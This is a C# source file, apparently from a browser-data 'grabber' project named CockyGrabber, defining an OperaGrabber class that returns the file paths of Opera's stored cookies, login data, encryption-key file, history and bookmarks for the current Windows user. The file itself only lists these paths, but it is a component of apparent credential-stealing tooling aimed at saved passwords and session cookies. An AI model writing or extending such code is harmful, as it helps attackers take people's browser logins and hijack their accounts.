using System;

namespace CockyGrabber.Grabbers
{
    public class OperaGrabber : BlinkGrabber 

    {
        public override string CookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies";
            }
        }
        public override string LocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State";
            }
        }
        public override string LoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data";
            }
        }
        public override string HistoryPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\History";
            }
        }
        public override string BookmarkPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Bookmarks";
            }
        }
    }
}